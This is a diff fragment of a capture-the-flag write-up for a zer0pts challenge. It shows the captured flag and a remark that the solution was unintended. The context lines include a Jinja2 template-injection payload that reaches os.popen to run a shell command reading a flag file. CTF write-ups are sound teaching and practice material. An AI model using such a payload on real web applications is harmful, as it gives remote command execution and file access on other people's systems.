@@ -71,5 +71,6 @@ namespace.__init__.__globals__.os.popen('cat ../../flag-wowRCEwow.txt').read() }
 
 **🚩Flag: `zer0pts{You_obtained_a_Bachelor_of_ZIP}`**
 
+
 ## P/S:
 This is unintended way to solve this challenge. After realizing unintended way, zer0pts team released a harder version.
